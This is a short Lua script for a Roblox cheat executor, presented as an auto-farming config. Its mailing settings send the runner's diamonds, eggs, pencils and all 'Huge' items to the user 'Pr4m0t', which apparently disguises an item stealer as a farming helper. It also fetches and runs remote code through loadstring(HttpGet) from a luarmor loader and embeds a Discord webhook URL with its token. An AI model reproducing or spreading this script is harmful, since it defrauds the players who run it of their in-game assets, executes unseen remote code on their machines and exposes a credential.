repeat wait(10) until game:IsLoaded()
getgenv().Config = {
    ["Farming"] = {
        ["AutoEvents"] = {"Party Box"},
        ["AutoOpen"] = {"Gift Bag", "Large Gift Bag", "Mini Chest", "Diamond Gift Bag"},
        ["AutoFlags"] = {"Fortune Flag"}
    },
    ["Mailing"] = {
        ["Usernames"] = {"Pr4m0t"},
        ["Items"] = {
            ["Currency"] = {
                ["Diamonds"] = 100000000,
            },
            ["Egg"] = {
                ["Huge Machine Egg 4"] = 1,
            },
            ["Misc"] = {
                ["Golden Pencil"] = 50,
                ["Diamond Pencil"] = 25,
                ["Rainbow Pencil"] = 10,
            }
        },
        ["MailAllHuges"] = true
    },
    ["Notifications"] = {
        ["UserID"] = "1167566243969126442",
        ["Webhook"] = "https://discord.com/api/webhooks/1325247690514108547/YmdB99x3z-O_yvUfquatKRoO8NwAzTa71eW2-UD3-2atNZO9K8N7DwwjOuMEC5Ywf14-"
    }
}
loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/83e3e1375d5a7c51c79df057fe9ea9e2.lua"))()
